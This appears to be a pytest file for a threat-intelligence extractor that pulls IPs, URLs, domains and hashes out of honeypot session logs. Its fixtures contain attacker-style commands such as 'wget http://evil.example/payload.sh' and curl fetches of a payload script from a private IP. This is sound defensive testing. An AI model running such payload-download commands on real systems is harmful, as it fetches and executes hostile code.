from intelligence.session.model import ReconstructedSession
from threat_intel.ioc.extractor import IOCExtractor


def test_extract_ipv4():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            "wget http://192.168.1.50/payload.sh",
        ],
    )

    iocs = extractor.extract(session)

    values = {(ioc.ioc_type, ioc.value) for ioc in iocs}

    assert ("ipv4", "192.168.1.50") in values


def test_extract_url():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            "wget http://evil.example/payload.sh",
        ],
    )

    iocs = extractor.extract(session)

    values = {(ioc.ioc_type, ioc.value) for ioc in iocs}

    assert (
        "url",
        "http://evil.example/payload.sh",
    ) in values


def test_extract_domain():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            "curl evil.example",
        ],
    )

    iocs = extractor.extract(session)

    values = {(ioc.ioc_type, ioc.value) for ioc in iocs}

    assert (
        "domain",
        "evil.example",
    ) in values


def test_extract_sha256():
    extractor = IOCExtractor()

    sha256 = (
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    )

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            f"echo {sha256}",
        ],
    )

    iocs = extractor.extract(session)

    values = {(ioc.ioc_type, ioc.value) for ioc in iocs}

    assert (
        "sha256",
        sha256,
    ) in values


def test_extract_md5():
    extractor = IOCExtractor()

    md5 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            f"echo {md5}",
        ],
    )

    iocs = extractor.extract(session)

    values = {(ioc.ioc_type, ioc.value) for ioc in iocs}

    assert (
        "md5",
        md5,
    ) in values


def test_invalid_ipv4_is_ignored():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            "connect 999.999.999.999",
        ],
    )

    iocs = extractor.extract(session)

    ipv4_values = {
        ioc.value
        for ioc in iocs
        if ioc.ioc_type == "ipv4"
    }

    assert "999.999.999.999" not in ipv4_values


def test_duplicate_iocs_are_removed():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="session-1",
        commands=[
            "wget http://192.168.1.50/payload.sh",
            "curl http://192.168.1.50/payload.sh",
        ],
    )

    iocs = extractor.extract(session)

    matching = [
        ioc
        for ioc in iocs
        if ioc.value == "http://192.168.1.50/payload.sh"
    ]

    assert len(matching) == 1
    assert matching[0].context == [
        "wget http://192.168.1.50/payload.sh",
        "curl http://192.168.1.50/payload.sh",
    ]


def test_ioc_contains_session_metadata():
    extractor = IOCExtractor()

    session = ReconstructedSession(
        session_id="attacker-session-42",
        commands=[
            "wget http://evil.example/payload.sh",
        ],
    )

    iocs = extractor.extract(session)

    assert len(iocs) >= 1

    url_ioc = next(
        ioc
        for ioc in iocs
        if ioc.ioc_type == "url"
    )

    assert url_ioc.source == "cowrie"
    assert url_ioc.session_id == "attacker-session-42"
    assert url_ioc.confidence == 1.0
